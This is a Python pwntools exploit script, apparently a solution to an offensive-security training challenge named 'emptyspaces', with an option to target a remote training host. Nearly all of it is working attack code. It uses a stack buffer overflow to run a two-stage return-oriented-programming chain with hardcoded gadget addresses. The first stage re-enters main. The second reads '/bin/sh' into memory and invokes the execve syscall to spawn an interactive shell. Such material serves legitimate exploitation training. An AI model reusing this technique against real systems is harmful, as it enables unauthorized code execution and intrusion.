from pwn import *
import sys
import time

context.arch = 'amd64'

if(len(sys.argv) > 1):
	if(sys.argv[1] == '--debug'):
		p = process("./emptyspaces")
		gdb.attach(p, """
		b *0x0000000000400696
		"""	)
		input("wait...")
	elif(sys.argv[1] == '--strace'):
		p = process(["strace", "./emptyspaces"])
	elif(sys.argv[1] == '--remote'):
		p = remote("bin.training.offdef.it", 4006)
else:
	p = process("./emptyspaces")

pop_rax = p64(0x00000000004155a4)
pop_rdi = p64(0x0000000000400696)
pop_rdx_pop_rsi = p64(0x000000000044bd59)
pop_rsi = p64(0x0000000000410133)
pop_rdx = p64(0x000000000044bd36)
syscall = p64(0x000000000040128c)
bss_addr = p64(0x6b6500) # address where we write /bin/sh
ret = p64(0x0000000000400416)
main = p64(0x00400bf8)

call_main = [
	b'A'*72,
	pop_rdx,
	p64(0x1000),
	main,
]

read_execve_payload = [
	b'A'*88,
	pop_rdi,
	p64(0x0),
	pop_rsi,
	bss_addr,
	p64(0x4497ba),
	ret,
	pop_rax,
	p64(0x3b),
	pop_rdi,
	bss_addr,
	pop_rdx_pop_rsi,
	p64(0x0),
	p64(0x0),
	syscall
]

first_stage = b''
for i in call_main:
	first_stage += i

second_stage = b''
for i in read_execve_payload:
	second_stage += i	

input('start')

p.sendline(first_stage)

sleep(0.1)

p.sendline(second_stage)

sleep(0.1)

p.sendline(b'/bin/sh\x00')

p.interactive()